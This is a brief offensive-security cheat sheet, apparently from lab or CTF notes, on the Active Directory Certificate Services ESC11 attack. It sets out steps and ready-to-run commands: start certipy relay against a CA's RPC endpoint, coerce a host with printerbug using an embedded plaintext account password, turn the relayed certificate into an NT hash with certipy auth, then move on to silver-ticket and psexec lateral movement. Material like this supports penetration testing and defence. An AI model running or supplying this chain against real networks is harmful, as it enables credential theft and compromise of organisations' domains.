# 12.01 ADCS Relay ESC11 RPC

> Relay over RPC/ICPR with `certipy relay` when `IF_ENFORCEENCRYPTICERTREQUEST` is disabled — same chain to NT hash as ESC8.

## Overview

ESC11 is NTLM relay to AD CS ICPR (ICertPassage RPC) endpoints. If the CA has IF_ENFORCEENCRYPTICERTREQUEST disabled, unencrypted relay over RPC can request certificates. Only certipy relay supports ICPR (ntlmrelayx's ICPR PR is unmerged). After obtaining the certificate with certipy relay, use certipy auth to extract the NT hash, then continue the ESC8 chain.

## Steps

- Certipy find flags ESC11 when Enforce Encryption for Requests is Disabled
- Run certipy relay -target rpc://CA -ca CA_NAME (must run as root)
- Coerce target with printerbug to send SMB NTLM auth to attacker
- certipy relay receives cert and saves ws01.pfx
- Use certipy auth -pfx ws01.pfx to obtain NT hash of the coerced machine account
- Continue with ticketer.py + psexec silver ticket chain (same as ESC8)

## Commands

### certipy relay ESC11

```bash
certipy relay -target "rpc://172.16.117.3" -ca "<DOMAIN>-DC01-CA"
```

### Coerce for ESC11

```bash
python3 printerbug.py <DOMAIN>/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.50 172.16.117.30
```

### certipy auth after ESC11

```bash
certipy auth -pfx ws01.pfx -dc-ip 172.16.117.3
```
